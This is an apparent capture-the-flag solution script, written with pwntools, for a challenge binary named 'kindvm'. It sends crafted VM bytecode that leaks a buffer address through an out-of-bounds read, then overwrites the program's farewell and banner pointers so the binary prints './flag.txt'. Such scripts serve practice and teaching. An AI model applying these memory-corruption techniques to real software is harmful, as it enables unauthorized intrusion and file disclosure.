from pwn import *

r = process('./kindvm')

main_addr = 0x0804877B

# Send the name as "./flag.txt"
r.recvuntil("name : ")
r.sendline("./flag.txt")
# Send the first program to leak the address of the name and overwrite kc->farewell to main
payload = chr(1) + chr(0) + p16(0xffd8)[::-1]      # LOAD reg[0], mem[-40]
payload += chr(8) + chr(0)                         # OUT reg[0]
payload += chr(7) + chr(0) + p32(main_addr)[::-1]  # IN reg[0], main_addr
payload += chr(2) + p16(0xffe4)[::-1] + chr(0)     # STORE mem[-28], reg[0]
payload += chr(6)                                  # HALT
r.recvuntil("instruction : ")
r.send(payload)
r.recvuntil("[out] ")
name_addr = int(r.recvuntil("(")[:-1], 16)
log.info("name_addr: " + hex(name_addr))
# Back to main, send an arbitrary name and overwrite kc->banner to name_addr
r.recvuntil("name : ")
r.sendline("ABCD")
payload2 = chr(7) + chr(0) + p32(name_addr)[::-1]  # IN reg[0], name_addr
payload2 += chr(2) + p16(0xffdc)[::-1] + chr(0)    # STORE mem[-24], reg[0]
payload2 += chr(6)                                 # HALT
r.recvuntil("instruction : ")
r.send(payload2)
# The flag will be printed out on the screen
r.interactive()
